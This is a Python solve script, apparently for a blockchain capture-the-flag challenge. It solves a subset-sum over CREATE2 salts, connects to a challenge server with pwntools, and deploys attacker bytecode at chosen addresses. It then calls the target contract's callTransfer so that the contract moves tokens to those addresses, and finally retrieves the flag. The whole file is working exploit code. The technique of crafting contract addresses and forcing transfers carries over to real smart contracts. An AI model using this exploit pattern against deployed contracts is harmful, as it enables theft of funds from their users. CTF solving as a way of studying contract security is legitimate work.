import pwn
from cheb3 import Connection
from cheb3.utils import encode_with_signature, calc_create2_address

def get_subsets(data: list, target: int):
    differences = {}
    for number in data:
        prospects = []
        for diff in differences:
            if number - diff == 0:
                new_subset = [number] + differences[diff]
                new_subset.sort()
                return new_subset
            elif number - diff < 0:
                prospects.append((number, diff))
        for prospect in prospects:
            new_diff = target - sum(differences[prospect[1]]) - prospect[0]
            differences[new_diff] = differences[prospect[1]] + [prospect[0]]
        differences[target - number] = [number]
    return []

def get_info(target):
    return svr.recvline_contains(target).split()[-1].strip().decode()

target = 133337
mod = 2**32
data = open("out.txt", "r").readline().split(",")[:-1]
data = [int(i, 16) for i in data]
data_new = [i % mod for i in data]
data_new = [i for i in data_new if i < target]

print(len(data_new))
subsets = get_subsets(data_new, target)
print(subsets)

HOST = "172.86.96.174"
PORT = 1337

svr = pwn.remote(HOST, PORT)
svr.sendlineafter(b"action?", b"1")
uuid = get_info(b"uuid")

conn = Connection(get_info(b"rpc"))
account = conn.account(get_info(b"private key"))
instance_addr = get_info(b"setup")
svr.close()
bytecode = "608060405234801561001057600080fd5b50610169806100206000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063686dc35914610030575b600080fd5b61004361003e3660046100f7565b610045565b005b6040805160608101825260008082526020820184815282840191825292516361e3cec960e11b81526001600160a01b03868116600483015260248201869052925160448201529251606484015251608483015284169063c3c79d929060a401600060405180830381600087803b1580156100be57600080fd5b505af11580156100d2573d6000803e3d6000fd5b50505050505050565b80356001600160a01b03811681146100f257600080fd5b919050565b60008060006060848603121561010c57600080fd5b610115846100db565b9250610123602085016100db565b915060408401359050925092509256fea26469706673582212202ae19af0c97221b7a1f4366b769addc9862742c2788ff6235adc2cba5ce8c6df64736f6c634300080d0033"
create2deployer = "0x4e59b44847b379578588920cA78FbF26c0B4956C"

# get the salt which corresponds to this subset number
subsets_cpy = subsets.copy()
for i in range(len(data_new)):
    if data_new[i] in subsets_cpy:
        for idx in range(len(data)):
            if data[idx] % mod == data_new[i]:
                print(f"salt: {idx}, subset_num: {data_new[i]}")
                account.send_transaction(create2deployer, data=f'{idx:064x}{bytecode}', gas_price=0)
                target = calc_create2_address(create2deployer, idx, bytes.fromhex(bytecode))
                account.send_transaction(target, data=encode_with_signature("callTransfer(address,address,uint256)", instance_addr, target, data_new[i]), gas_price=0)
                subsets_cpy.remove(data_new[i])
                break

svr = pwn.remote(HOST, PORT)
svr.sendlineafter(b"action?", b"3")
svr.sendlineafter(b"uuid please: ", uuid.encode())
svr.interactive()
